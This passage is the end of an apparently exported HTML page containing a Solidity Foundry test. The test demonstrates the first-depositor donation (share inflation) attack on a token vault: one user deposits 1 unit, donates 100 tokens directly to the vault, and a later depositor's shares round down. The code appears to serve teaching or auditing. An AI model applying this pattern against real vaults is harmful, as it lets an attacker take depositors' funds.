    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">print</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">private</span></span> </span>{
        console2.log(<span class="hljs-string">"vault total supply"</span>, vault.totalSupply());
        console2.log(<span class="hljs-string">"vault balance"</span>, token.balanceOf(<span class="hljs-keyword">address</span>(vault)));
        <span class="hljs-keyword">uint256</span> shares0 <span class="hljs-operator">=</span> vault.balanceOf(users[<span class="hljs-number">0</span>]);
        <span class="hljs-keyword">uint256</span> shares1 <span class="hljs-operator">=</span> vault.balanceOf(users[<span class="hljs-number">1</span>]);
        console2.log(<span class="hljs-string">"users[0] shares"</span>, shares0);
        console2.log(<span class="hljs-string">"users[1] shares"</span>, shares1);
        console2.log(<span class="hljs-string">"users[0] redeemable"</span>, vault.previewRedeem(shares0));
        console2.log(<span class="hljs-string">"users[1] redeemable"</span>, vault.previewRedeem(shares1));
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
        <span class="hljs-comment">// users[0] deposit 1</span>
        console2.log(<span class="hljs-string">"--- users[0] deposit ---"</span>);
        vm.prank(users[<span class="hljs-number">0</span>]);
        vault.deposit(<span class="hljs-number">1</span>);
        print();

        <span class="hljs-comment">// users[0] donate 100</span>
        console2.log(<span class="hljs-string">"--- users[0] donate ---"</span>);
        vm.prank(users[<span class="hljs-number">0</span>]);
        token.<span class="hljs-built_in">transfer</span>(<span class="hljs-keyword">address</span>(vault), <span class="hljs-number">100</span> <span class="hljs-operator">*</span> (<span class="hljs-number">10</span> <span class="hljs-operator">*</span><span class="hljs-operator">*</span> DECIMALS));
        print();

        <span class="hljs-comment">// users[1] deposit 100</span>
        console2.log(<span class="hljs-string">"--- users[1] deposit ---"</span>);
        vm.prank(users[<span class="hljs-number">1</span>]);
        vault.deposit(<span class="hljs-number">100</span> <span class="hljs-operator">*</span> (<span class="hljs-number">10</span> <span class="hljs-operator">*</span><span class="hljs-operator">*</span> DECIMALS));
        print();
    }
}
</code></pre>`

export default html
